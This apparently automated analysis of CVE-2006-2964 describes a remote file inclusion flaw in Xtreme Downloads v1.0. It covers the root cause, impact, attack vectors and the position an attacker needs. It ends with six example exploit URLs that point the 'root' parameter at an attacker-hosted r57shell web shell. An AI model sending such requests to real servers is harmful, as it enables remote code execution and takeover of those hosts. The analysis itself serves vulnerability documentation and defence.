Based on the provided information, here's an analysis of CVE-2006-2964:

**Root Cause of Vulnerability:**

*   The vulnerability stems from multiple file include vulnerabilities present in Xtreme Downloads v1.0. The application improperly handles user-supplied input in the `root` parameter, allowing the inclusion of remote files.

**Weaknesses/Vulnerabilities Present:**

*   **Remote File Inclusion (RFI):** The primary vulnerability is the ability to include remote files via the `root` parameter in various PHP scripts within the application.
*   **Lack of Input Sanitization:** The application fails to properly sanitize or validate user-supplied input for the `root` parameter, allowing attackers to specify arbitrary URLs.

**Impact of Exploitation:**

*   **Arbitrary Code Execution:** By including a remote file containing malicious PHP code (e.g., `r57shell.txt`), an attacker can achieve arbitrary code execution on the server.
*   **Complete System Compromise:** Successful code execution could allow an attacker to gain full control over the vulnerable server, potentially leading to data theft, modification, or further attacks.
*   **Partial Confidentiality, Integrity, and Availability Impact:** The CVSS score indicates a partial impact on confidentiality, integrity, and availability, suggesting that an attacker could potentially read sensitive information, modify data, or disrupt service.

**Attack Vectors:**

*   **HTTP GET Requests:** The vulnerability is exploited by sending crafted HTTP GET requests to specific PHP files, including `download.php`, `manager.php`, `category.php`, `add_allow.php`, `index.php` and `login.php` with the `root` parameter pointing to a malicious URL.

**Required Attacker Capabilities/Position:**

*   **Remote Network Access:** The attacker needs to have network access to the vulnerable server.
*   **Ability to Host Malicious File:** The attacker needs the ability to host a malicious PHP file that will be included by the vulnerable application.
*   **No Authentication Required:** The exploitation does not require authentication, making it accessible to anonymous attackers.

**More Detail Than CVE Description:**

*   The provided content includes the vulnerable file paths and the specific parameters (`root`) that can be exploited.
*   The content provides example URLs for exploitation, which demonstrate how to include a malicious file.
*   It lists the exact files affected, giving specific targets to the RFI vulnerability.

The exploit examples provided are:
*  `http://www.example.com/path/download.php?root=http://yoursite/r57shell.txt?`
*  `http://www.example.com/path/manager.php?root=http://yoursite/r57shell.txt?`
*  `http://www.example.com/path/admin/scripts/category.php?root=http://yoursite/r57shell.txt?`
*  `http://www.example.com/path/includes/add_allow.php?root=http://yoursite/r57shell.txt?`
* `http://www.example.com/path/admin/index.php?root=http://yoursite/r57shell.txt?`
*  `http://www.example.com/path/admin/admin/login.php?root=http://yoursite/r57shell.txt?`
